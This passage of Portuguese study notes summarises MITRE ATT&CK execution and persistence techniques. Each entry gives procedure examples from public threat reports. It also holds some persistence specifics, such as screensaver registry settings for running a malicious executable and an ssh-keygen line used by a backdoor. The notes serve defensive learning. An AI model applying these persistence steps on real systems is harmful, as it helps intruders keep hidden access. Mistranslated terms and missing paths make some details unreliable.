.002 **Arquivo Malicioso:** Os usuários podem ser submetidos à engenharia social para fazê-los abrir um arquivo que levará à execução do código. Esta ação do usuário normalmente será observada como comportamento de seguimento do Anexo Spearphishing. Os adversários podem usar vários tipos de arquivos que exigem que o usuário os execute, incluindo .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif e .cpl.

**Exemplo de procedimento:** Podemos citar o mesmo exemplo de procedimento da sub-técnica passada. 

.003 **Imagem Maliciosa:** Os adversários podem contar com um usuário executando uma imagem maliciosa para facilitar a execução. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images e Azure Images, bem como tempos populares de execução de contêineres, como o Docker, podem ser backdoored.

**Exemplo de procedimento:** Atacantes colocaram imagens maliciosos no Docker Hub usando a conta Docker Hub de um usuário legítimo. As credênciais para a conta foram acidentalmente comprometida com um repositório público do GitHub.

**REFERÊNCIA:** https://www.lacework.com/blog/taking-teamtnt-docker-images-offline/

T1047 ** INSTRUMENTAÇÃO DE GERENCIAMENTO DO WINDOWNS:** Os adversários podem abusar do WMI. WMI é um recurso de administração que fornece um ambiente uniforme para acessar componentes do sistema Windows. O serviço WMI permite acesso local e remoto, embora este último seja facilitado por serviços remotos, como O Modelo de Objeto de Componente Distribuído (DCOM) e Windows Remote Management (WinRM)

**Exemplo de procedimento:** Astaroth é conhecida por infectar vítimas através de e-mails falsos de fatura, a maioria dos quais se originam de um remetente malicioso se passando por serviços legítimos usando domínios cam.br.

![image](https://user-images.githubusercontent.com/95362045/154144690-8d0281b5-c1c2-49e2-a9e2-b896074e6de1.png)

Analisando o ataque pelo WireShark podemos ver que o ataque foi visando vítimas sul americanos, as URLs estavam hospedados no CloudFlare

![image](https://user-images.githubusercontent.com/95362045/154144875-efbc9d79-e9f0-4397-a314-3d80d4ddf2db.png)

O arquivo é um .Ink malicioso que continha um link para uma URL. o WMIC fornece uma interface de linha de comando, O download permite que o JS e VBs sejam executados dentro dele, momento em que o malware é executado.

**REFERÊNCIA:** https://cofense.com/seeing-resurgence-demonic-astaroth-wmic-trojan/

TA0003 **PERSISTÊNCIA:** 

Consiste na técnica que os atacantes usam para manter o acesso a sistemas através de reinicializções, credenciais alteradas e outras interrupções que corte o seu acesso

T1098 **Manipulação de contas:** Os atacantes podem manipular contas para manter o acesso a sistemas das vítimas. A manipulação de contas pode consistir em qualquer ação que preserve o acesso adversário a uma conta comprometida, como modificar credenciais ou permissões.

**Exemplo de procedimento:** Atacantes adicionaram contas recém-criadas ao grupo de administradores para manter acesso elevado. Os atacantes empregaram uma váriedade de TTPs como email de spear phishing, coleta de credenciais, etc. Os atacantes escolheram organizações alvo, os atacantes acessaram informações disponíveis em publicos. Após realizar o procedimento foi usado Email de spearPhishing, encaminhando anexos maliciosos para explorar funções do Microsoft Office. 

**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/TA18-074A

.001 **Credenciais adicionais em nuvem:** Os atacantes podem adicionar credenciais controladas por adversários a uma conta em nuvem para manter acesso persistente às contas e instâncias das vítimas dentro do ambiente.

**Exemplo de procedimento:**  O APT29 adicionou credenciais aos principais aplicativos e diretores de serviços da OAuth.es: Atacantes comprometeram sistemas internos de construção da empresa SolarWinds, incorporando um código Backdoor em uma biblioteca com o nome do arquivo, esse backdoor era distribuido através de plataformas de atualização automática. O aplicativo da SolarWinds ao ser atualizado, o código backdoor é incorporado e carregado antes do código legítimo ser executado.

**REFERÊNCIA:** https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/

.002 **Permissões de e-mail:** Os atacantes podem conceder níveis adicionais de permissão, como ReadPermission para manter acesso persistente a uma conta de email controlado por adversários. O Cmdlet PowerShell adiciona permissões a uma caixa de correio.

**Exemplo de procedimento:** Os atacantes usaram uma combinação de TTPs conhecidos, além de seu spray de senha operações para explorar redes de destino, acessar credenciais. Os atacantes usaram uma variedade de protocolos, incluindo HTTP(S), IMAP(S), POP3 e NTLM, também utilizou diferentes combinações de TTPs de evasão de defesa na tentativa de disfarçar alguns componentes de suas operações.

![image](https://user-images.githubusercontent.com/95362045/154355428-e03fbaa9-2e2c-43dc-81e7-323a7227ce13.png)

*1°* Realizaram brute force com intenção de obter credenciais válidas

*2°* Foi usado as credenciais válidas para acesso inicial, usando tambem vulnerabilidades já constatadas para execução de acesso remoto para escalar previlégios.

*3°* Realizando movimento lateral para acesso adicional na rede da vítima

*4°* Usando conta de serviço em nuvem com permissão para acesso persistente para filtragem de caixa de email.

**REFERÊNCIA:** https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF

.003 **ADICIONAR FUNÇÃO DE ADMINISTRADOR GLOBAL DO OFFICE 365:** Um atacante pode adicionar o papel de administrador global a uma conta controlada por adversários para manter acesso persistente a um inquilino offce 365.

**Exemplo de procedimento:** Com permissões suficientes uma conta comprometida pode obter acesso quase ilimitado a dados e configurações.

.004 **Chaves autorizadas SSH:** Distribuições Linux e Mac usam autenticação baseada em chaves para proteger o processo de autenticação de sessão SSH para gerenciamento remoto. Os usuários podem editar o arquivo config SSH para modificar as diretivas PubkeyAuthentication

**Exemplo de procedimento:** Um backdoor XCSSET criará uma chave ssh, se necessário. Carregará um arquivo de chave privado para o servidor para acessar remotamente o host sem uma senha. ssh-keygen -t rsa -f $home/ .ssh /id_rsa -P

**REFERÊNCIA:** https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf   

T1197 **EMPREGO DE BITS:** Os adversários podem abusar dos trabalhos do BITS para executar ou limpar persistentemente após cargas maliciosas. O Bits (Windows Background Intelligent Transfer Service, serviço de transferência inteligente de fundo do Windows) é um mecanismo de transferência de arquivos assíncrona de baixa largura de banda exposto através do Com (Component Object Model, modelo de objeto componente)

**Exemplo de procedimento:**  usou o protocolo BITS para exfiltrar dados roubados de um host comprometido. vários scripts VBS maliciosos usados. O malware VBS foi incorporado no Microsoft  Documentos do Office e enviados às vítimas por meio de spear phishing ou outras técnicas de engenharia social. Uma vez aberto, o documento do Office foi desobstruído e quebrou dois scripts que executam as seguintes ações:

**REFERÊNCIA:** https://www.iranwatch.org/sites/default/files/public-intelligence-alert.pdf

T1547 **Execução inicial ou logon autostart:** Os adversários podem configurar as configurações do sistema para executar automaticamente um programa durante a inicialização do sistema ou logon para manter a persistência ou obter privilégios de nível superior em sistemas comprometidos.

**Exemplo de procedimento:** O RAT do Dtrack faz um arquivo de destino persistente com execução automática no início do host: autores de malware incorporaram seu código malicioso em um binário que era um executável inofensivo. Em alguns casos, era o projeto padrão do Visual Studio MFC, mas poderia ser qualquer outro programa.

**REFERÊNCIA:** https://securelist.com/my-name-is-dtrack/93338/

.001 **Registry Run Keys / Pasta de inicialização:** Os adversários podem obter persistência adicionando um programa a uma pasta de inicialização ou fazendo referência a ele com uma chave de execução de registro. A adição de uma entrada às "teclas de execução" na pasta Registro ou inicialização fará com que o programa referenciado seja executado quando um usuário fizer login.

**Exemplo de procedimento:**  Pode se adicionar ao Registro como um programa de inicialização para estabelecer persistência: O malware foi espalhado através de um documento do microsoft word que continha um arquivo exe incorporado. 

![image](https://user-images.githubusercontent.com/95362045/154536888-4743128f-f4b2-446f-acc0-cec038525c90.png)

Como você pode ver, ele pede à vítima para clicar duas vezes no ícone azul para ativar uma "visão clara". Uma vez clicado, ele extrai um arquivo exe do objeto incorporado na pasta temporária do sistema e executa-o. Neste caso, o arquivo exe é chamado de "POM.exe".

![image](https://user-images.githubusercontent.com/95362045/154536946-bbd0bf62-eec5-4770-a08a-9cecbed058f2.png)

**REFERÊNCIA:** https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant

.002 **Pacote de autenticação:** Os adversários podem abusar dos pacotes de autenticação para executar DLLs quando o sistema é inicializado. Os DDLs do pacote  de autenticação do windowns são carregadas pelo processo da Autoridade de Segurança local. Os adversários podem usar mecanismo de inicialização automática fornecido pelos pacotes de autenticação LSA para manter a persistência.

**Exemplo de procedimento:** Existem várias maneiras de o malware se propagar. Um método que conhecemos é relacionado à atualização do Windows e download de arquivos por alguns módulos usando SSL e alguns protocolo proprietário baseado em texto.

**REFERÊNCIA:** https://www.crysys.hu/publications/files/skywiper.pdf

.003 **Provedores de tempo:** O serviço Windowns Time permite a sincronização de tempo entre e dentro dos domínios. Os provedores de tempo são implementados como bibliotecas de link dinâmico.

**Exemplo de procedimento:** Os adversários podem abusar dessa arquitetura para estabelecer persistência, especificamente registrando e permitindo um DLL malicioso como provedor de tempo. O gerenciador de provedores de tempo, dirigido pelo gerenciador de controle de serviços, carrega e inicia os provedores de tempo listados e habilitados sob esta chave na inicialização do sistema e/ou sempre que os parâmetros são alterados.

.004 **Winlogon Helper DLL:** Os adversários podem abusar dos recursos do Winlogon para executar DLLs ou executáveis quando um usuário faz login. Winlogon.exe é um componente do Windowns responsáveis por ações em logon/logoff, bem como a sequência de atenção seguras acionada pelo Ctrl-alt-delete.

**Exemplo de procedimento:** Após realizar todo o processo de invasão, pode ser usar técnicas para persistência, incluindo a criação de uma tarefa programada adicionando à pasta de inicialização como atalho criando um trabalho programado de BITS 

**REFERÊNCIA:** https://www.mandiant.com/resources/kegtap-and-singlemalt-with-a-ransomware-chaser

.005 **Provedor de suporte de segurança:** Os atacantes podem abusar dos provedores de suporte de segurança (SSPs) para executar DLLs quando o sistema inicializa. A configuraçãp SSP é armazenada em duas chaves de registro. Um atacante pode modificar essas chaves de registro para adicionar novos SSPs.

**Exemplo de procedimento:** Pode enumerar SSPs e utilizar PowerSploit e instalar SSPs maliciosos e registrar eventos de autenticação.

.006 **Módulos e estensões do Kernel:** Os adversários podem modificar o Kernel para executar automaticamente programas na inicialização do sistema. Os módulos de Kernel carregados são peças de código que podem carregar e descarregar no kernel mediante demanda

**Exemplo de procedimento:** Skidmap é um malware de linux, ele carrega módulos de Kernel maliciosos para manter suas operações de mineração. Os atacantes também podem usá-los para obter acesso irrestrito ao sistema afetado. Skidmap também pode configurar uma senha mestra secreta que lhe da acesso a qualquer conta de usuários no sistema.

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/19/i/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload.html

.007 **Reaugurações:** Os atacantes podem modificar arquivos plist para executar automaticamente um aplicativo quando um usuário faz login. A partir do Mac OS X 10.7 (Lion), os usuários podem especificar que certos aplicativos serão reabertos quando um usuário faz login em sua máquina após a reinicialização.

**Exemplo de procedimento:** Um adversário pode modificar um desses arquivos diretamente para incluir um link para seu executável malicioso para fornecer um mecanismo de persistência cada vez que o usuário reinicia sua máquina.

**REFERÊNCIA:** https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf

.008 **LSASS DRIVER:** Os adversários podem modificar ou adicionar drivers LSASS para obter persistência em sistemas comprometidos. O subsistema de segurança do Windows é um conjunto de componentes que gerenciam e aplicam a política de segurança de um computador ou domínio. 

**Exemplo de procedimento:** Os atacantes podem atingir os drivers LSASS para obter persistência. Ao substituir ou adicionar drivers ilegítimos (por exemplo, Hijack Execution Flow), um adversário pode usar as operações LSA para executar continuamente cargas maliciosas.

.009 **Modificação do atalho:** Atalhos podem ser criados para executar um programa durante a inicialização do sistema ou o login do usuário. Os adversários podem usar atalhos para executar suas ferramentas para persistência.

**Exemplo de procedimento:** O ator da ameaça criou os e-mails de phishing para se disfarçar como um funcionário do Departamento de Assuntos Públicos do Departamento de Estado dos EUA compartilhando um documento oficial. Os links levaram a um arquivo ZIP que continha um arquivo de atalho do Windows com armas hospedado em um domínio legítimo provavelmente comprometido, jmj[.]. com. O arquivo de atalho foi criado para executar um comando PowerShell que lê, decodificou e executou código adicional dentro do arquivo de atalho.

**REFERÊNCIA:** https://www.mandiant.com/resources/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign

.010 **Port Monitors:** Os adversários podem usar monitores de porta para executar um DLL fornecido pelo invasor durante a inicialização do sistema para persistência ou escalada de privilégios. Um monitor de porta pode ser definido através da chamada API para definir um DLL a ser carregado na inicialização.

**Exemplo de procedimento:** Os adversários podem usar essa técnica para carregar código malicioso na inicialização que persistirá na reinicialização do sistema e execução como SISTEMA.

.011 **Modificação de plist:** Os atacantes podem modificar arquivos de prioridades para executar seu código como parte do estabelecimento da persistência. Os adversários podem modificar caminhos para binários executados, adicionar argumentos de linha de comando e inserir valores de chave/par para plist arquivos em locais de execução automática que são executados após o logon do usuário ou a inicialização do sistema. 

.012 **Processadores de impressão:** Processadores de impressão pode ser usados para executar DLLs maliciosos durante a inicialização do sistema para escalada ou persistencia.

**Exemplo de procedimento:** Em pelo menos um caso, os operadores de malware comprometeram o sistema de construção da vítima, o que poderia ter levado a um ataque da cadeia de suprimentos, permitindo que os atacantes trojanizem executáveis do jogo. Em outro caso, os servidores do jogo foram comprometidos, o que poderia ter permitido que os atacantes, por exemplo, manipulassem moedas no jogo para obter ganhos financeiros.

**REFERÊNCIA:** https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/

.013 **Entradas de inicialização automática XDG:** Os adversários podem modificar as entradas de inicialização automática do XDG para executar programas ou comandos durante a inicialização do sistema. 

**Exemplo de procedimento:** Os adversários podem usar entradas de inicialização automática XDG para manter a persistência executando comandos e cargas maliciosas, como ferramentas de acesso remoto, durante a inicialização de um ambiente desktop. Em qualquer sistema semelhante ao Unix que use uma área de trabalho compatível com XDG Freedesktop.org, você pode adicionar uma entrada de inicialização automática para executar um aplicativo ou script quando a área de trabalho é carregada. Esses arquivos geralmente existem sob essas pastas, embora você possa alterá-los com variáveis de ambiente:

**REFERÊNCIA:** https://redcanary.com/blog/netwire-remote-access-trojan-on-linux/

.014 **Configuração Ativa:** A persistencia pode ser alcançada adicionando uma chave de registro à configuração ativa da máquina local. Active Setup é um mecanismo do Windowns usado para executar programas quando um usuário faz login.

**Exemplo de procedimento:** Os adversários podem abusar desses componentes para executar malwares, como ferramentas de acesso remoto, para manter a persistência através de reinicializações do sistema. Poisonivy é um trojan backdoor que permite acesso e controle não autorizados de uma máquina afetada. Ele tenta se esconder injetando-se em outros processos.

**REFERÊNCIA:** https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Backdoor%3aWin32%2fPoisonivy.E


**REFERÊNCIA:** https://unit42.paloaltonetworks.com/unit42-tropic-trooper-targets-taiwanese-government-and-fossil-fuel-provider-with-poison-ivy/

.015 **Itens de login:** Itens de login podem ser adicionado para executar no login do usuário para obter persistência ou aumenta privilégios. Os itens de login são aplicativos, documentos, pastas ou conexões de servidor que são lançadas automaticamente quando um usuário faz login. Os itens de login podem ser adicionados através de uma lista de arquivos compartilhados ou do Service Management Framework. Os adversários podem utilizar chamadas de API Do AppleScript e Nativas para criar um item de login para gerar executáveis maliciosos.

**Exemplo de procedimento:** Netwire é um RAT distribuído pela World Wired Labs e comercializado como uma ferramenta de gerenciamento remoto. Ele permite acesso remoto aos sistemas Windows, macOS, Linux e Solaris, e é usado principalmente para transferir arquivos e conduzir o gerenciamento do sistema de várias maneiras.

**REFERÊNCIA:** https://redcanary.com/blog/netwire-remote-access-trojan-on-linux/

T1037 **SCRIPT DE INICIALIZAÇÃO:** Os adversários podem usar scripts executados automaticamente na inicialização do inicialização ou logon para estabelecer persistência. Os scripts de inicialização podem ser usados para executar funções administrativas. Os adversários podem usar esses scripts para manter a persistência em um único sistema.

.001 **Logon Script (Windows):** Os atacantes podem usar scripts com logon do windowns executados automaticamente na inicialização do logon para estabelecer persistência. Usando os Scripts dependendo da configuração de acesso dos scripts de logon, credenciais locais ou conta de administrador podem ser necessárias.

**Exemplo de procedimento:**  Podemos criar script de logon para atribuir tarefas que serão executadas quando um usuário fizer logon em um computador. Os scripts realizam comandos dos sistemas operacionais

**REFERÊNCIA:** https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc758918(v=ws.10)?redirectedfrom=MSDN

.002 **Logon Script (Mac):** Os adversários podem usar scripts de lohon MacOs executados automaticamente na inicialização de logon para estabelecer persistência. O acesso a scripts de login pode permitir que um adversário insira códigos maliciosos adicionais.

**Exemplo de procedimento:** Usando LauchAgent é a maneira de persistência, cada mac pode ter uma pasta LauchAgents em sua biblioteca para especificar código que deve ser executado toda vez que o usuário fizer login

**REFERÊNCIA:** https://www.sentinelone.com/blog/how-malware-persists-on-macos/

.003 **Script de logon de rede:** Script de logon de rede pode ser executados automaticamente na inicialização para estabelecer persistencia, scripts de logon são executados com os privilégios do usuário a quem são atribuidos.

**Exemplo de procedimento:** Basicamente, há duas maneiras de atribuir scripts Logon. A primeira é feita na guia Perfil da caixa de diálogo de propriedades do usuário no Active Directory Users and Computers (ADUC). O segundo é feito via Group Policy Objects (GPO). Este artigo se concentrará no primeiro método.

**REFERÊNCIA:** https://petri.com/setting-up-logon-script-through-active-directory-users-computers-windows-server-2008

.004 **RC Script:** Modificando scripts de RC é executado durante a inicialização de um sistema semelhante a unix. Esses arquivos permitem que os administradores do sistema mapeiem e iniciem serviços personalizados na inicialização para diferentes níveis de execução. Os adversários podem estabelecer persistência adicionando um caminho binário malicioso ou comandos de shell a , e outros scripts RC específicos para a distribuição semelhante ao Unix.

**Exemplo de procedimento:** Um método chamado addtoStartup quer persistirá no malware modificando o arquivo/etc/rc.common.

**REFERÊNCIA:** https://objective-see.com/blog/blog_0x25.html#MacDownloader

.005 **Itens de inicialização:** Os itens de inicialização são executados durante a fase final do processo de inicialização e contêm scripts shell ou outros arquivos executáveis, juntamente com informações de configuração usadas pelo sistema para determinar a ordem de execução de todos os itens de inicialização

**Exemplo de procedimento:** Um adversário pode criar as pastas/arquivos apropriados no diretório Doms startup para registrar seu próprio mecanismo de persistência. 

T1176 **EXTENSÕES DE NAVEGADORES:** Os adversários podem abusar das extensões do navegador para estabelecer acesso aos sistemas das vítimas. Extensões de navegadores ou plugins como é chamado são pequenos programas que podem adicionar funcionalidades e personalizar aspectos dos navegadores da internet. Eles podem ser instalados diretamente ou através das lojas de aplicativos de uma navegador e geralmente tem permissões a tudo que o navegador acessar. Extensões maliciosas podem ser instaladas em um navegador através de downloads maliciosos da loja de aplicativos disfarçados de extensões legítimas. Uma vez que a extensão é instalada, ela pode navegar para sites em segundo plano, roubar todas as informações que um usuário insere em um navegador (incluindo credenciais) e ser usado como instalador para um RAT para persistência.

**Exemplo de procedimento:** Hackers usaram e-mails de phishing para atrair vítimas em sites copiados de organizações acadêmicas legítimas. Esses sites de phishing, mostraram um documento PDF benigno, mas impediram que os usuários o visualizassem, redirecionando as vítimas para a página oficial da Chrome Web Store para instalar uma extensão (agora removida) do Chrome chamada Auto Font Manager.

**REFERÊNCIA:** https://www.zdnet.com/article/cyber-espionage-group-uses-chrome-extension-to-infect-victims/

T1554 **Comprometer o binário do software do cliente:** Os adversários podem fazer modificações nos binários de software do cliente para realizar tarefas maliciosas quando esses aplicativos estiverem em uso. Por exemplo, um adversário pode copiar o código-fonte do software cliente, adicionar um backdoor, compilar para o alvo e substituir o binário de aplicativo legítimo (ou arquivos de suporte) com o backdoored.

**Exemplo de procedimento:** Um grupo de atacantes usou um aplicativo de navegador malicioso para substituir o navegador legítimo, a fim de capturar continuamente credenciais, monitorar o tráfego da Web e baixar módulos adicionais

**REFERÊNCIA:** https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf

T1136 **CRIAR CONTA:** Os atacantes podem criar uma conta para manter acesso aos sistemas das vítimas. Com um nível suficiente de acesso a criação dessas contas pode ser usado para estabelecer acesso credenciado.

.001 **Conta local:** As contas locais são aquelas configuradas por uma organização para uso por usuários, suporte remoto, serviços ou para administração. Essas contas podem ser usadas para estabelecer acesso credenciado secundário que não exijam ferramentas de acesso remoto persistentes a serem implantadas no sistema.

**Exemplo de procedimento:** O APT39 criou contas em vários hosts comprometidos para executar ações dentro da rede. Eles criaram as próprias contas de usuário pare realizar movimentos laterais.

**REFERÊNCIA:** https://www.bitdefender.com/blog/labs/iranian-chafer-apt-targeted-air-transportation-and-government-in-kuwait-and-saudi-arabia/

.002 **Conta de domínio:** Contas de domínio são aquelas gerenciadas pelos serviços de dominio do Active Directory, onde o acesso e as permissões são configurados entre sistemas e serviços que fazem parte desse domínio.

**Exemplo de procedimento:** Uma VPN voltado externamente foi o vetor de acesso inicial explorado pelo ator permitindo que eles gerassem um pergil de VPN e se juntasse à rede de destino usando o nome de Host "Commando" 

**REFERÊNCIA:** https://research.nccgroup.com/2021/06/15/handy-guide-to-a-new-fivehands-ransomware-variant/

.003 **Conta na nuvem:** Os atacantes podem criar conta na nuvem para manter acesso aos sistemas das vítimas, com um nível suficiente de acesso essas contas podem ser usadas para estabelecer acesso credenciado secundário que não exija ferramentas persistentes de acesso remoto, Atacantes podem criar contas que só tenham acesso a serviços especificos em nuvem, o que pode reduzir as chances de detecção.

**REFERÊNCIA:** https://support.google.com/cloudidentity/answer/7332836?hl=en&ref_topic=7558554

T1543 **CRIAR OU MODIFICAR O PROCESSO DO SISTEMA:** Criando e modificando processos oara executar cargas maliciosos pode ser usado por atacantes como modo de adquirir persistencia em um sistema. Os adversários podem instalar novos serviços, daemons ou agentes que possam ser configurados para executar na inicialização ou um intervalo repetível, a fim de estabelecer persistência. Da mesma forma, os adversários podem modificar serviços, daemons ou agentes existentes para alcançar o mesmo efeito.

**Exemplo de procedimento:** Backdoor feito em GO tem um local codificado que usa para alcançar persistencia se o sistema de inicialização for UpStart ou System V e ele estiver funcionando como raiz.

**REFERÊNCIA:** https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf

.001 **Agente de lançamento:** Quando um usuário faz login é iniciado um processo iniciado por usuário que carrega os parâmetros para cada agente usuário de lançamento sob demanda a partir do arquivo da lista de propriedades. Os agentes de lançamento são frequentemente instalados para executar atualizações em programas, iniciar programas especificados pelo usuário no login ou para realizar outras tarefas de desenvolvedor.

.002 **Serviço Sistemal:** O gerenciador de serviços sistemacado é comumente usado para gerenciar processos de daemon em segundo plano (também conhecidos como serviços) e outros recursos do sistema. Os adversários usaram a funcionalidade sistemalizado para estabelecer acesso persistente aos sistemas das vítimas, criando e/ou modificando arquivos de unidade de serviço que fazem com que o sistema execute comandos maliciosos no inicialização do sistema.

**Exemplo de procedimento:** Um trojan relacionado ao grupo hacker Sednit usa uma estruturas de módulo onde cada módulo é implementado como uma classe separada, os módulos são dos tipos plug-ins e controladores. Durante a instalação, o Trojan tenta obter privilégios radiculares. Se for bem sucedido, o malware será instalado na pasta /bin/ com o nome rsyncd e com a descrição "sincronizar e serviço de backup". Se ele não tiver sucesso, o Linux.BackDoor.Fysbis.1 será instalado em ~/.config/dbus-notifier como um arquivo executável com o nome dbus-inotifier e com a descrição "system service d-bus notifier".

**REFERÊNCIA:** https://vms.drweb.com/virus/?i=4276269

.003 **Serviço Windowns:** Os atacantes podem criar ou modificar os serviços do windowns para executar repetidamente cargas maliciosas para adquirir persistência. Os adversários podem instalar um novo serviço ou modificar um serviço existente usando utilitários do sistema para interagir com os serviços, modificando diretamente o Registro ou usando ferramentas personalizadas para interagir com a API do Windows.

**Exemplo de procedimento:** Um exemplo aplicativo Malicioso Celas Trade Pro é um instalador MSI. O pacote de instalação do INSTALADOr MSI compreende um componente de software e uma interface de programação de aplicativos (API) que a Microsoft usa para a instalação, manutenção e remoção de software. O instalador parece legítimo e é assinado por um certificado Sectigo válido que foi comprado pelo mesmo usuário do certificado SSL para celasllc com (Obter recursos: Certificados de Assinatura de Código. O Instalador MSI pede à vítima privilégios administrativos para executar (Execução do Usuário: Arquivo Malicioso.msi 

**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/aa21-048a

.004 **Launch Daemon:** O Launch Daemons requer privilégios elevados para instalar, são executados para cada usuário em um sistema antes do login e executados em segundo plano sem a necessidade de interação do usuário. Os adversários podem instalar um Deemon de lançamento configurado para execução na inicialização usando o parâmetro definido e o parâmetro definido para o caminho executável malicioso.

**Exemplo de procedimento:** Ao executar com privilégios raiz após a instalação de um Agente de Lançamento, o ThiefQuest instala um arquivo plist na pasta com o conjunto de teclas para estabelecer persistência como um Daemon de lançamento. /Library/LaunchDaemons/RunAtLoadtrue

**REFERÊNCIA:** https://objective-see.com/blog/blog_0x59.html

T1546 **EXECUÇÃO DESENCADEADA DE EVENTO:** Vários sistemas operacionais têm meios para monitorar e assinar eventos como logons ou outras atividades do usuário, como executar aplicativos/binários específicos. Uma vez que a execução pode ser proxied por uma conta com permissões mais altas, como SISTEMA ou contas de serviço, um adversário pode ser capaz de abusar desses mecanismos de execução acionados para aumentar seus privilégios.

.001 **Alterar associação de arquivos padrão:** Quando um arquivo é aberto, o programa padrão usado para abrir o arquivo (também chamado de associação de arquivos ou manipulador) é verificado. As seleções de associação de arquivos são armazenadas no Registro do Windows e podem ser editadas por usuários, administradores ou programas que tenham acesso ao Registro ou por administradores usando o utilitário assoc embutido. 

**Exemplo de procedimento:** Kimsuky tem um módulo de roubo de documentos HWP que altera a associação padrão do programa no registro para abrir documentos HWP. Ao ser executado no Windows 7, a biblioteca maliciosa usa o código aberto Win7Elevate do Metasploit Framework para injetar código malicioso no explorador.exe. De qualquer forma, seja o Windows 7 ou não, este código malicioso descriptografa sua biblioteca de espionagem de recursos, salva-o em disco com um nome aparentemente aleatório, mas codificado por força

**REFERÊNCIA:** https://securelist.com/the-kimsuky-operation-a-north-korean-apt/57915/

.002 **Protetor de tela:** Os atacantes podem estabelecer persistência executando conteúdo malicioso desencadeado pela inatividade do usuário. Os adversários podem usar configurações de protetor de tela para manter a persistência, definindo o protetor de tela para executar malware após um determinado período de inatividade do usuário.

**Exemplo de procedimento:** O aplicativo de screensaver do Windows scrnsave.scr está localizado em , e em sistemas Windows de 64 bits, juntamente com protetores de tela incluídos com instalações base do Windows.C:\Windows\System32\C:\Windows\sysWOW64\

As seguintes configurações do protetor de tela são armazenadas no Registro () e podem ser manipuladas para alcançar a persistência:HKCU\Control Panel\Desktop\

SCRNSAVE.exe - definido para o caminho de PE malicioso
ScreenSaveActive - definido como '1' para habilitar o protetor de tela
ScreenSaverIsSecure - definido como '0' para não exigir uma senha para desbloquear
ScreenSaveTimeout - define o tempo limite de inatividade do usuário antes que o protetor de tela seja executado

**REFERÊNCIA:** https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf

.003 **Assinatura do evento de instrumentação do Gerenciamento do Windowns:** Os adversários podem estabelecer persistência e elevar privilégios executando conteúdo malicioso desencadeado por uma assinatura de evento WMI (Windows Management Instrumentation)

**Exemplo de procedimento:** Os adversários podem usar os recursos do WMI para assinar um evento e executar código arbitrário quando esse evento ocorrer, proporcionando persistência em um sistema. Os adversários também podem compilar scripts WMI em arquivos MOF (Windows Management Object, objeto de gerenciamento do Windows) que podem ser usados para criar uma assinatura maliciosa.

**REFERÊNCIA:** https://www.secureworks.com/blog/wmi-persistence

.004 **Modificação e configuração do Unix Shell:** O Usuário Unix Shells executa vários scripts de configuração em diferentes pontos ao longo da sessão com base em eventos. Por exemplo, quando um usuário abre uma interface de linha de comando ou faz login remotamente (como via SSH) uma cápsula de login é iniciada. O shell de login executa scripts do sistema e do diretório doméstico do usuário  para configurar o ambiente. 

**Exemplo de procedimento:** Os adversários podem tentar estabelecer persistência inserindo comandos em scripts executados automaticamente por conchas. Usando o bash como exemplo, o shell padrão para a maioria dos sistemas GNU/Linux, os adversários podem adicionar comandos que lançam binários maliciosos nos arquivos./etc/profile/etc/profile.d. Esses arquivos normalmente requerem permissões radiculares para modificar e são executados cada vez que qualquer shell em um sistema é lançado.

**REFERÊNCIA:** https://www.anomali.com/blog/pulling-linux-rabbit-rabbot-malware-out-of-a-hat

.005 **Armadilha:** Usando sinal de interrupção os atacantes podem estabelecer persistência executando conteudo malicioso.  O comando permite que programas e projéteis especifiquem comandos que serão executados após o recebimento de sinais de interrupção. Uma situação comum é um script que permite a rescisão graciosa e manuseio de interrupções comuns do teclado como e .trap ctrl+ cctrl+d

**Exemplo de procedimento:** Os adversários podem usá-lo para registrar código a ser executado quando o shell encontra interrupções específicas como um mecanismo de persistência. Os comandos trap são do seguinte formato onde a "lista de comando" será executada quando "sinais" forem recebidos.trap 'command list' signals

**REFERÊNCIA:** https://ss64.com/bash/trap.html

.006 **Adição LC_LOAD_DYLIB:** Os atacantes podem estabelecer persistência executando conteúdo malicioso desencadeado pela execução de binários contaminados. Mach-O têm uma série de cabeçalhos que são usados para executar certas operações quando um binário é carregado. O cabeçalho LC_LOAD_DYLIB em um binário Mach-O diz ao macOS e ao OS X quais bibliotecas dinâmicas (dylibs) carregam durante o tempo de execução.

**Exemplo de procedimento:** Os adversários podem modificar cabeçalhos binários Mach-O para carregar e executar dílitos maliciosos toda vez que o binário é executado. Embora quaisquer alterações invalidem assinaturas digitais em binários porque o binário está sendo modificado, isso pode ser corrigido simplesmente removendo o comando LC_CODE_SIGNATURE do binário para que a assinatura não seja verificada no momento da carga. 

**REFERÊNCIA:** https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf

.007 **Netsh Helper DLL:**  Netsh.exe (também chamado de Netshell) é um utilitário de script de linha de comando usado para interagir com a configuração de rede de um sistema. Ele contém funcionalidade para adicionar DLLs auxiliares para estender a funcionalidade do utilitário.

**Exemplo de procedimento:** Os adversários podem usar DLLs de ajuda .exe netsh para desencadear a execução de código arbitrário de forma persistente. Essa execução ocorreria sempre que a netsh.exe for executada, o que poderia acontecer automaticamente, com outra técnica de persistência, ou se outro software (ex: VPN) estiver presente no sistema que executa netsh.exe como parte de sua funcionalidade normal. 

**REFERÊNCIA:** https://github.com/outflanknl/NetshHelperBeacon

